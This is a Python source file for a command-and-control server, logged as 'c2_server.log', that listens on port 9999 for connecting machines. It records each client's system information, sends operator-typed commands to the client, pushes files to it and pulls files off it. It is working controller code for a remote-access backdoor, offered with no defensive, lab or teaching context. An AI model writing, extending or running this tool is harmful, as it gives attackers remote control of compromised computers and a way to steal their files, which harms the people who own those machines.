import socket
import threading
import logging
import os

# Server configuration
HOST = '0.0.0.0'
PORT = 9999

# Configure logging
logging.basicConfig(filename='c2_server.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def handle_client(client_socket, addr):
    with client_socket:
        # Receive and log system information from the client
        system_info = client_socket.recv(4096).decode('utf-8')
        logging.info(f"Connected to {addr[0]}:{addr[1]}")
        logging.info(f"System Information from {addr[0]}:{addr[1]}:\n{system_info}")
        print(f"[*] System Information from {addr[0]}:{addr[1]}:\n{system_info}")

        while True:
            try:
                command = input("Enter command: ")
                if command.lower() == 'exit':
                    client_socket.sendall(b'exit')
                    break

                if command.startswith('upload'):
                    _, filepath = command.split(' ', 1)
                    if os.path.exists(filepath):
                        client_socket.sendall(f'upload {os.path.basename(filepath)}'.encode())
                        with open(filepath, 'rb') as f:
                            data = f.read()
                            client_socket.sendall(data)
                        print(f"[*] Uploaded {filepath}")
                    else:
                        print(f"[!] File {filepath} does not exist")
                        continue
                
                elif command.startswith('download'):
                    client_socket.sendall(command.encode())
                    filename = command.split(' ', 1)[1]
                    with open(filename, 'wb') as f:
                        data = client_socket.recv(4096)
                        while data:
                            f.write(data)
                            data = client_socket.recv(4096)
                    print(f"[*] Downloaded {filename}")
                
                else:
                    client_socket.sendall(command.encode())
                    # Receive the response from the client
                    response = client_socket.recv(4096).decode('utf-8')
                    logging.info(f"Response from {addr[0]}:{addr[1]}:\n{response}")
                    print(f"[*] Received: {response}")

            except Exception as e:
                logging.error(f"Error handling client {addr[0]}:{addr[1]}: {e}")
                print(f"[!] Error: {e}")
                break
        logging.info(f"Connection to {addr[0]}:{addr[1]} closed")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    start_server()
